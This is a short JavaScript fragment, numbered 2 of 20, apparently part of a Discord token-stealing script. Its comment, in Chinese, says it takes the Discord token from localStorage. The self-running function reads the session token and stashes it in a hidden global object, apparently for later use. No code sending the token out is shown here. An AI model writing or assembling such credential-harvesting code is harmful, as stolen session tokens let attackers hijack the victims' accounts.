// === Fragment 2/20 ===
// 從 localStorage 獲取 Discord token
(function() {
  window.__d = window.__d || {};
  try { var t = localStorage.getItem("token"); if (t) t = t.replace(/"/g, ""); window.__d.token = t; } catch(e) {}
})();
